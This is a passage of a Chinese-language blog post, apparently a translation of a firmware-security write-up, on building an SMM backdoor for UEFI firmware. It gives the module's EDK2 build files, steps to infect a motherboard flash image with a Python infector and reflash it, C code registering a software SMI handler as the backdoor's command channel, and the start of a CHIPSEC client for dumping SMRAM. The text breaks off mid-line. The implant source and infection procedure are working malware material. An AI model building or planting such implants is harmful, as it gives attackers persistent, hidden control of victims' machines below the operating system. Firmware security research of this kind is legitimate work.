class="line"></span><br><span class="line"># required EDK packages</span><br><span class="line">[Packages]</span><br><span class="line">  MdePkg/MdePkg.dec</span><br><span class="line">  MdeModulePkg/MdeModulePkg.dec</span><br><span class="line">  IntelFrameworkPkg/IntelFrameworkPkg.dec  </span><br><span class="line">  IntelFrameworkModulePkg/IntelFrameworkModulePkg.dec  </span><br><span class="line">  StdLib/StdLib.dec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># required EDK libraries</span><br><span class="line">[LibraryClasses]</span><br><span class="line">  UefiDriverEntryPoint</span><br><span class="line">  UefiBootServicesTableLib</span><br><span class="line">  DebugLib</span><br><span class="line">  DevicePathLib</span><br><span class="line">  SynchronizationLib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># required EDK protocols</span><br><span class="line">[Protocols]</span><br><span class="line">  gEfiSimpleTextOutProtocolGuid</span><br><span class="line">  gEfiLoadedImageProtocolGuid</span><br><span class="line">  gEfiSmmCpuProtocolGuid</span><br><span class="line">  gEfiSmmBase2ProtocolGuid</span><br><span class="line">  gEfiSmmAccess2ProtocolGuid</span><br><span class="line">  gEfiSmmSwDispatch2ProtocolGuid</span><br><span class="line">  gEfiSmmPeriodicTimerDispatch2ProtocolGuid</span><br><span class="line">  gEfiDevicePathProtocolGuid</span><br><span class="line">  gEfiSerialIoProtocolGuid  </span><br><span class="line"> </span><br><span class="line"># load order dependencies (none)</span><br><span class="line">[Depex]</span><br><span class="line">  TRUE</span><br></pre></td></tr></table></figure>

<p>同样，你需要编辑<code>OvmfPkg/OvmfPkgX64.dsc</code>并在文件末尾添加以下行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">  # 3-rd party drivers</span><br><span class="line">  #</span><br><span class="line">  SmmBackdoor/SmmBackdoor.inf &#123;</span><br><span class="line">    &lt;LibraryClasses&gt;</span><br><span class="line">      DebugLib|OvmfPkg/Library/PlatformDebugLibIoPort/PlatformDebugLibIoPort.inf</span><br><span class="line">      MemoryAllocationLib|MdePkg/Library/UefiMemoryAllocationLib/UefiMemoryAllocationLib.inf</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>


<p>编译SmmBackdoor项目:</p>
<ol>
<li>运行Visual Studio 2008命令行并cd到EDK2目录。</li>
<li>执行<code>Edk2Setup.bat --pull</code> 来构建环境并下载所需的二进制文件。</li>
<li><code>cd SmmBackdoor &amp;&amp; build</code></li>
<li>编译后产生的PE image文件位于<code>Build/OvmfX64/DEBUG_VS2008x86/X64/SmmBackdoor/SmmBackdoor/OUTPUT/SmmBackdoor.efi</code></li>
</ol>
<p>将<code>SmmBackdoor.efi</code>作为感染器payload并运行：</p>
<ol>
<li>在UEFITool中打开测试主板的原始flash image。</li>
<li>提取PE image的FFS文件，GUID &#x3D; <code>26A2481E-4424-46A2-9943-CC4039EAD8F8</code></li>
<li>用pyhton感染器将<code> SmmBackdoor.efi</code>插入到提取的 image 中</li>
<li>在UEFITool中将原PE image 替换为被感染的PE image 。</li>
<li>保存修改后的flash image文件，并使用flashrom和SPI编程器或任何其他方便的方式将固件 写入主板ROM芯片 。</li>
</ol>
<h2 id="调试输出"><a href="#调试输出" class="headerlink" title="调试输出"></a>调试输出</h2><p>后门开发中棘手的部分是如何获取调试输出。基本上，有两种方法可以解决这个问题:</p>
<ul>
<li>使用I&#x2F;O寄存器<code>3F8h:3FFh</code>将调试输出写入到串口中。</li>
<li>使用EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL将调试输出到屏幕上。</li>
</ul>
<p>Intel DQ77KB主板串口连接到 legacy port controller (super I&#x2F;O)，通过[Low Pin Circuit] (<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Low_Pin_Count)(LPC)%E6%80%BB%E7%BA%BF%E4%B8%8EQ77">https://en.wikipedia.org/wiki/Low_Pin_Count)(LPC)总线与Q77</a> Platform controller Hub (PCH)进行通信：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161757875.png" alt="image-20230809161757875"></p>
<p>问题是在DXE阶段相对较晚的阶段固件才会初始化这个控制器，所以如果使用COM端口的话，我们不会看到在SMM后门初始化期间执行的BackdoorEntry()和其他函数的任何调试信息。当然，我们可以自己编写代码来手动配置super I&#x2F;O控制器，但是这样的代码并不是很可靠，因为市场上有太多不同的控制器模型和不同的配置接口。<br><code>EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</code>也有类似的问题——它在受感染的镜像初始化和runtime阶段都不可用(这是更关键的)。<br>为了处理这种不愉快的情况，我实现了如下的调试消息发送功能：</p>
<ol>
<li><code>DbgMsg()</code>函数试图在所有可能的情况下将每个消息打印到屏幕和COM端口。</li>
<li>如果屏幕和控制台I&#x2F;O还没有初始化——<code>DbgMsg()</code>则将消息文本保存到全局缓冲区中。</li>
<li>当<code>EFI_SIMPLE_TEXT_OUTPUT_PROTOCOL</code>可用时，固件将调用在后门初始化期间注册的通知函数，通知函数会初始化后门控制台I&#x2F;O并打印全局缓冲区中保存的消息。</li>
</ol>
<p>这种方法允许我们在屏幕上看到DXE阶段的调试信息，并通过COM端口接收runtime阶段的调试信息。当然，这样的解决方案并不是最方便的，但它应该能工作在不同类型的主板上，而不是取决于感染的镜像加载顺序。<br>SMM backdoor最终版本的屏幕调试信息示例：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161804919.png" alt="image-20230809161804919"></p>
<h2 id="使用SW-SMI与SMM通信"><a href="#使用SW-SMI与SMM通信" class="headerlink" title="使用SW SMI与SMM通信"></a>使用SW SMI与SMM通信</h2><p>前面我们只讨论了SMM阶段的SMRAM初始化部分，第二个重要的部分是SMI调度。UEFI SMM foundation和SMM协议的所有SMIhandler可以分为三类:</p>
<ul>
<li>Root SMI控制器handler——通过使用HandleType NULL值来调用<code>EFI_SMM_SYSTEM_TABLE2.SmiHandlerRegister()</code>注册的主handler。在CPU中生成的每个SMI上都会调用这个handler。通常，Root SMIhandler代码会确定中断源并调用适当的子SMI控制器handler。</li>
<li>子SMI控制器 handler ——处理单个中断源。SMM协议驱动通过使用HandleType的非NULL值调用<code>EFI_SMM_SYSTEM_TABLE2.SmiHandlerRegister()</code>来注册这样的 handler 。特定SMM协议的子 handler 正在调用使用此协议API注册的SMI handler 。</li>
<li>SMI handler ——协议特定的 handler 可以被其他SMM驱动程序注册和注销。</li>
</ul>
<p>平台初始化规范定义了以下SMM子调度协议：</p>
<ul>
<li><p><code>EFI_SMM_SW_DISPATCH2_PROTOCOL</code> —— 提供通过向APMC I&#x2F;O端口B2h中写入值而生成的SMI的调度服务。</p>
</li>
<li><p><code>EFI_SMM_SX_DISPATCH2_PROTOCOL</code> —— 为ACPI Sx事件提供调度服务。</p>
</li>
<li><p><code>EFI_SMM_PERIODIC_TIMER_DISPATCH2_PROTOCOL</code> —— 提供APIC定时器事件的调度服务。</p>
</li>
<li><p><code>EFI_SMM_USB_DISPATCH2_PROTOCOL</code> —— 提供USB总线事件的调度服务。</p>
</li>
<li><p><code>EFI_SMM_GPI_DISPATCH2_PROTOCOL</code> —— 为General Purpose Input(GPI) SMI源提供调度服务。</p>
</li>
<li><p><code>EFI_SMM_STANDBY_BUTTON_DISPATCH2_PROTOCOL</code> —— 为SMI备用按钮源提供调度服务。</p>
</li>
<li><p><code>EFI_SMM_POWER_BUTTON_DISPATCH2_PROTOCOL</code> —— 提供电源按钮SMI电源的调度服务。</p>
</li>
<li><p><code>EFI_SMM_IO_TRAP_DISPATCH2_PROTOCOL</code> —— 提供I&#x2F;O指令重启事件的调度服务。</p>
</li>
</ul>
<p>当然，并不是所有的固件供应商都实现了所有这些协议，但是它们中的大多数都应该可以在任何与UEFI兼容的硬件上使用。<br>与SMM后门通信最简单的方式是使用I&#x2F;O端口B2h来触发SMI。<code> EFI_SMM_SW_DISPATCH2_PROTOCOL</code>允许我们注册一个SMIhandler，当一些运行在操作系统下的代码将一些handler写入这个I&#x2F;O端口时，该handler将被调用：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// software SMI handler number to communicate with the backdoor</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BACKDOOR_SW_SMI_VAL 0xCC</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// software SMI handler register context</span></span><br><span class="line">EFI_SMM_SW_REGISTER_CONTEXT m_SwDispatch2RegCtx = &#123; BACKDOOR_SW_SMI_VAL &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EFI_STATUS EFIAPI <span class="title function_">SwDispatch2Handler</span><span class="params">(</span></span><br><span class="line"><span class="params">    EFI_HANDLE DispatchHandle,</span></span><br><span class="line"><span class="params">    CONST VOID *Context,</span></span><br><span class="line"><span class="params">    VOID *CommBuffer,</span></span><br><span class="line"><span class="params">    UINTN *CommBufferSize)</span></span><br><span class="line">&#123;</span><br><span class="line">    EFI_SMM_SW_CONTEXT *SwContext = (EFI_SMM_SW_CONTEXT *)CommBuffer;</span><br><span class="line">    EFI_SMM_CPU_PROTOCOL *SmmCpu = <span class="literal">NULL</span>;</span><br><span class="line">    EFI_STATUS Status = EFI_SUCCESS;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    DbgMsg(</span><br><span class="line">        __FILE__, __LINE__, </span><br><span class="line">        __FUNCTION__<span class="string">&quot;(): command port = 0x%X, data port = 0x%X\r\n&quot;</span>,</span><br><span class="line">        SwContext-&gt;CommandPort, SwContext-&gt;DataPort</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取 SMM CPU协议</span></span><br><span class="line">    Status = gSmst-&gt;SmmLocateProtocol(&amp;gEfiSmmCpuProtocolGuid, <span class="literal">NULL</span>, (PVOID *)&amp;SmmCpu);</span><br><span class="line">    <span class="keyword">if</span> (Status == EFI_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        UINT64 Rcx = <span class="number">0</span>;                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从CPU保存状态查询RCX寄存器值</span></span><br><span class="line">        Status = SmmCpu-&gt;ReadSaveState(</span><br><span class="line">            SmmCpu, <span class="keyword">sizeof</span>(Rcx), EFI_SMM_SAVE_STATE_REGISTER_RCX, </span><br><span class="line">            SwContext-&gt;SwSmiCpuIndex, (PVOID)&amp;Rcx</span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">if</span> (EFI_ERROR(Status))</span><br><span class="line">        &#123;</span><br><span class="line">            DbgMsg(__FILE__, __LINE__, <span class="string">&quot;ReadSaveState() fails: 0x%X\r\n&quot;</span>, Status);</span><br><span class="line">            <span class="keyword">goto</span> _end;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 处理请求句柄</span></span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        DbgMsg(__FILE__, __LINE__, <span class="string">&quot;LocateProtocol() fails: 0x%X\r\n&quot;</span>, Status);   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_end:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EFI_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line">EFI_STATUS EFIAPI <span class="title function_">SwDispatch2ProtocolNotifyHandler</span><span class="params">(</span></span><br><span class="line"><span class="params">    CONST EFI_GUID *Protocol, </span></span><br><span class="line"><span class="params">    VOID *Interface, </span></span><br><span class="line"><span class="params">    EFI_HANDLE Handle)</span></span><br><span class="line">&#123;</span><br><span class="line">    EFI_STATUS Status = EFI_SUCCESS;</span><br><span class="line">    EFI_HANDLE DispatchHandle = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标协议</span></span><br><span class="line">    EFI_SMM_SW_DISPATCH2_PROTOCOL *SwDispatch = (EFI_SMM_SW_DISPATCH2_PROTOCOL *)Interface;    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    DbgMsg(__FILE__, __LINE__, <span class="string">&quot;Max. SW SMI value is 0x%X\r\n&quot;</span>, SwDispatch-&gt;MaximumSwiValue);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// register software SMI handler</span></span><br><span class="line">    Status = SwDispatch-&gt;Register(</span><br><span class="line">        SwDispatch, </span><br><span class="line">        SwDispatch2Handler, </span><br><span class="line">        &amp;m_SwDispatch2RegCtx,</span><br><span class="line">        &amp;DispatchHandle</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (Status == EFI_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgMsg(__FILE__, __LINE__, <span class="string">&quot;SW SMI handler is at &quot;</span>FPTR<span class="string">&quot;\r\n&quot;</span>, SwDispatch2Handler);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        DbgMsg(__FILE__, __LINE__, <span class="string">&quot;Register() fails: 0x%X\r\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EFI_SUCCESS;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line">VOID <span class="title function_">BackdoorEntrySmm</span><span class="params">(VOID)</span></span><br><span class="line">&#123;</span><br><span class="line">    PVOID Registration = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... skipped ...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 注册SMM协议信息</span></span><br><span class="line">    EFI_STATUS Status = gSmst-&gt;SmmRegisterProtocolNotify(</span><br><span class="line">        &amp;gEfiSmmSwDispatch2ProtocolGuid, </span><br><span class="line">        SwDispatch2ProtocolNotifyHandler, </span><br><span class="line">        &amp;Registration</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (Status == EFI_SUCCESS)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgMsg(</span><br><span class="line">            __FILE__, __LINE__, <span class="string">&quot;SMM protocol notify handler is at &quot;</span>FPTR<span class="string">&quot;\r\n&quot;</span>,</span><br><span class="line">            SwDispatch2ProtocolNotifyHandler</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        DbgMsg(__FILE__, __LINE__, <span class="string">&quot;RegisterProtocolNotify() fails: 0x%X\r\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... skipped ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>正如你所看到的，后门代码调用<code>EFI_SMM_SYSTEM_TABLE2.SmmRegisterProtocolNotify()</code>函数来通知<code>EFI_SMM_SW_DISPATCH2_PROTOCOL</code>为可用。handler函数调用<code>EFI_SMM_SW_DISPATCH2_PROTOCOL.Register()</code>函数来注册一个SMIhandler，当CCh值将被写入到B2h I&#x2F;O端口时，该handler被调用。SMIhandler使用<code>EFI_SMM_CPU_PROTOCOL</code>从保存的执行状态中获取CPU寄存器值。<br>现在，既然我们可以与后门通信了，那么开始执行payload吧。我们能够从SMM中做的最有用的事情是——为SMRAM内容的转储提供一些外部接口。我按照以下方法设计了这个接口：</p>
<ol>
<li>在初始化期间，后门通过MemType参数的<code>EfiRuntimeServicesData</code>值调用<code>EFI_BOOT_SERVICES.AllocatePages()</code>来分配2000h的物理内存，这些内存将在DXE和runtime阶段可用。</li>
<li>后门存储这个内存地址在固件变量中的常量名，所以，操作系统可以使用<code>EFI_RUNTIME_SERVICES.GetVariable()</code>函数来获取地址。Windows通过kernel32.dll的<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms724325(v=vs.85).aspx">GetFirmwareEnvironmentVariable()</a>函数或NT内核的<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/windows/hardware/jj151553(v=vs.85).aspx">ExGetFirmwareEnvironmentVariable()</a>函数提供对固件变量的访问。在Linux固件上，变量可以作为伪文件在<a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/ABI/stable/sysfs-firmware-efi-vars">&#x2F;sys&#x2F;firmware&#x2F;efi&#x2F;efivars</a>(或<code>/sys/firmware/efi/vars</code>)目录下，也可以通过<code>mount -t efivars none /some/path</code>挂载到其他位置。</li>
<li>Non-SMM代码存储内存页地址转储到CPU寄存器中，并通过向B2h I&#x2F;O端口写入常量命令号来触发SMI。</li>
<li><code>SwDispath2ProtocolNotifyHandler()</code>后门函数将指定地址的内存页内容复制到之前分配的内存中并退出SMM。</li>
<li>触发SMI时——non-SMM代码从固件变量中查询后门分配的物理内存地址，并获取转储内存的内容。</li>
</ol>
<p>为了给non-SMM代码提供更多有用的信息，后门也在分配内存开始的地方存储了以下结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">BACKDOOR_INFO</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">// 已调用的SMI个数</span></span><br><span class="line">    UINTN CallsCount;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// EFI_STATUS 最后的操作</span></span><br><span class="line">    UINTN BackdoorStatus;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 带有可用SMRAM区域信息的结构体列表。</span></span><br><span class="line">    <span class="comment">// EFI_SMRAM_DESCRIPTOR的值为零。PhysicalStart表示列表的最后一项。</span></span><br><span class="line">    EFI_SMRAM_DESCRIPTOR SmramMap[];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; BACKDOOR_INFO,</span><br><span class="line">*PBACKDOOR_INFO;</span><br></pre></td></tr></table></figure>


<p>为了填充<code>SmramMap</code>字段，后门调用<code>EFI_SMM_ACCESS2_PROTOCOL.GetCapabilities()</code>函数，该函数返回带有所需信息的<code>EFI_SMRAM_DESCRIPTOR</code>结构体。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/chipsec/chipsec">CHIPSEC, 英特尔的一个固件安全评估框架</a>，为不同的硬件和固件特性提供了一个方便的跨平台Python API：物理内存的读取，EFI变量和PCI配置空间，SMI触发等。让我们来写一些后门通信代码来利用SMRAM转储功能：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, os</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># CHIPSEC目录路径</span></span><br><span class="line">CHIPSEC_PATH = <span class="string">&#x27;/opt/chipsec/source/tool&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys.path.append(CHIPSEC_PATH)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># SW SMI和后门SMM代码通信的命令值</span></span><br><span class="line">BACKDOOR_SW_SMI_VAL = <span class="number">0xCC</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对后门的SW SMI命令</span></span><br><span class="line">BACKDOOR_SW_DATA_READ_PHYS_MEM  = <span class="number">1</span> <span class="comment"># 读取物理内存命令</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># EFI变量和_BACKDOOR_INFO结构体的物理地址</span></span><br><span class="line">BACKDOOR_INFO_EFI_VAR = <span class="string">&#x27;SmmBackdoorInfo-3a452e85-a7ca-438f-a5cb-ad3a70c5d01b&#x27;</span></span><br><span class="line">BACKDOOR_INFO_FMT = <span class="string">&#x27;QQ&#x27;</span></span><br><span class="line">BACKDOOR_INFO_LEN = <span class="number">8</span> * <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PAGE_SIZE = <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cs = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Chipsec</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, uefi, mem, ints</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        self.uefi, self.mem, self.ints = uefi, mem, ints</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">efi_var_get</span>(<span class="params">name</span>):</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解析name-GUID格式的字符串变量</span></span><br><span class="line">    name = name.split(<span 